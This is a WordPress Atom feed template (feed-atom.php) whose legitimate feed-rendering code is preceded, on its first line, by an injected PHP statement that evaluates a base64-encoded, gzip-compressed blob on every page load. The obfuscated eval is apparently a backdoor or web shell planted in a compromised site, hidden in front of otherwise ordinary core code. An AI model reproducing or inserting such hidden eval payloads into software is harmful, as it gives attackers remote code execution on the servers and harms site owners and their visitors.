<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Atom Feed Template for displaying Atom Posts feed.
 *
 * @package WordPress
 */

header('Content-Type: ' . feed_content_type('atom') . '; charset=' . get_option('blog_charset'), true);
$more = 1;

echo '<?xml version="1.0" encoding="'.get_option('blog_charset').'"?'.'>';

/** This action is documented in wp-includes/feed-rss2.php */
do_action( 'rss_tag_pre', 'atom' );
?>
<feed
  xmlns="http://www.w3.org/2005/Atom"
  xmlns:thr="http://purl.org/syndication/thread/1.0"
  xml:lang="<?php bloginfo_rss( 'language' ); ?>"
  xml:base="<?php bloginfo_rss('url') ?>/wp-atom.php"
  <?php
  /**
   * Fires at end of the Atom feed root to add namespaces.
   *
   * @since 2.0.0
   */
  do_action( 'atom_ns' );
  ?>
 >
	<title type="text"><?php wp_title_rss(); ?></title>
	<subtitle type="text"><?php bloginfo_rss("description") ?></subtitle>

	<updated><?php
		$date = get_lastpostmodified( 'GMT' );
		echo $date ? mysql2date( 'Y-m-d\TH:i:s\Z', $date, false ) : date( 'Y-m-d\TH:i:s\Z' );
	?></updated>

	<link rel="alternate" type="<?php bloginfo_rss('html_type'); ?>" href="<?php bloginfo_rss('url') ?>" />
	<id><?php bloginfo('atom_url'); ?></id>
	<link rel="self" type="application/atom+xml" href="<?php self_link(); ?>" />

	<?php
	/**
	 * Fires just before the first Atom feed entry.
	 *
	 * @since 2.0.0
	 */
	do_action( 'atom_head' );

	while ( have_posts() ) : the_post();
	?>
	<entry>
		<author>
			<name><?php the_author() ?></name>
			<?php $author_url = get_the_author_meta('url'); if ( !empty($author_url) ) : ?>
			<uri><?php the_author_meta('url')?></uri>
			<?php endif;

			/**
			 * Fires at the end of each Atom feed author entry.
			 *
			 * @since 3.2.0
			 */
			do_action( 'atom_author' );
		?>
		</author>
		<title type="<?php html_type_rss(); ?>"><![CDATA[<?php the_title_rss() ?>]]></title>
		<link rel="alternate" type="<?php bloginfo_rss('html_type'); ?>" href="<?php the_permalink_rss() ?>" />
		<id><?php the_guid() ; ?></id>
		<updated><?php echo get_post_modified_time('Y-m-d\TH:i:s\Z', true); ?></updated>
		<published><?php echo get_post_time('Y-m-d\TH:i:s\Z', true); ?></published>
		<?php the_category_rss('atom') ?>
		<summary type="<?php html_type_rss(); ?>"><![CDATA[<?php the_excerpt_rss(); ?>]]></summary>
<?php if ( !get_option('rss_use_excerpt') ) : ?>
		<content type="<?php html_type_rss(); ?>" xml:base="<?php the_permalink_rss() ?>"><![CDATA[<?php the_content_feed('atom') ?>]]></content>
<?php endif; ?>
	<?php atom_enclosure();
	/**
	 * Fires at the end of each Atom feed item.
	 *
	 * @since 2.0.0
	 */
	do_action( 'atom_entry' );

	if ( get_comments_number() || comments_open() ) :
		?>
		<link rel="replies" type="<?php bloginfo_rss('html_type'); ?>" href="<?php the_permalink_rss() ?>#comments" thr:count="<?php echo get_comments_number()?>"/>
		<link rel="replies" type="application/atom+xml" href="<?php echo esc_url( get_post_comments_feed_link(0, 'atom') ); ?>" thr:count="<?php echo get_comments_number()?>"/>
		<thr:total><?php echo get_comments_number()?></thr:total>
	<?php endif; ?>
	</entry>
	<?php endwhile ; ?>
</feed>
